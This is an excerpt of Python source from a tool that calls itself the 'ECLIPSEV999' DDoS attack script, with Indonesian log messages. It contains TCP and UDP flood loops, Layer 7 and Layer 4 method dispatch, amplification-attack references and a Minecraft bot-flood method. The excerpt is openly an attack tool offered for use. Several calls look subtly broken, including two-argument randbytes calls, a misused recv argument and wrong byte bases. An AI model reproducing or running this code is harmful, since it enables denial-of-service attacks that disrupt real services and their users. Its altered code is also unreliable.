...
class Tools:
    ...
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        ...
        if i > 0:
            base = 4096 if binary else 65534
...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(65535,4096)):
                continue
        Tools.safe_close(s)
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(65534,4096), self._target):
                continue
        Tools.safe_close(s)
...
class ToolsConsole:
    ...
    @staticmethod
    def stop():
        print('Semua Serangan telah Dihentikan !')
    ...
    def usage():
        print((
                  '* ECLIPSEV999 - DDoS Attack Script With %d Methods\n'
        ...
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if method == "BOMB":
                    assert (
                        ...
                        "Install bombardier: "
                        "https://github.com/ECLIPSEV999/ECLIPSEV999/wiki/BOMB-method"
                    )
                ...
                if threads > 65534 or threads < 1:
                    logger.warning("Tidak Bisa Melebihi Pacet Dari 1 - 65534")
                if rpc > 65534 or rpc < 1:
                    logger.warning(
                        "RPC (RPC) Tidak Bisa Melebihi Rpc Dari 1 - 65534")
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method in Methods.LAYER4_AMP:
                    ...
                    logger.warning("https://github.com/ECLIPSEV999/ECLIPSEV999/wiki/Amplification-ddos-attack")
                ...
                if not port:
                    logger.warning("Port Tidak Dipilih, Setel Ke Default: 80")
                    port = 80
                ...
                protocolid = con ["MINECRAFT_DEFAULT_PROTOCOLID"]
                ...
                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        ...
                        protocolid = Tools.protocolRex.search(str(s.recv(65534,4096)))
                        protocolid = con ["MINECRAFT_DEFAULT_PROTOCOLID"] if not protocolid else int(protocolid.group(1))
            ...
            logger.info(
                f"{bcolors.FAIL}Send Packet To{bcolors.WARNING} %s{bcolors.FAIL} Dengan{bcolors.WARNING} %s{bcolors.FAIL} Methods Tools{bcolors.WARNING} %s{bcolors.FAIL} And Seconds, And Threads:{bcolors.WARNING} %d{bcolors.FAIL}!!!{bcolors.RESET}"
                % (target or url.host, method, timer, threads))
            event.set()
            ts = time()
            while time() < ts + timer:
                logger.debug(
                    f'{bcolors.OKBLUE}Target Host:{bcolors.OKGREEN} %s,{bcolors.OKBLUE} Target Port:{bcolors.OKGREEN} %s,{bcolors.OKBLUE} Methods Tools:{bcolors.OKGREEN} %s{bcolors.OKBLUE} PPS:{bcolors.OKGREEN} %s,{bcolors.OKBLUE} BPS:{bcolors.OKGREEN} %s / %d%%{bcolors.RESET}' %
                    (target or url.host,
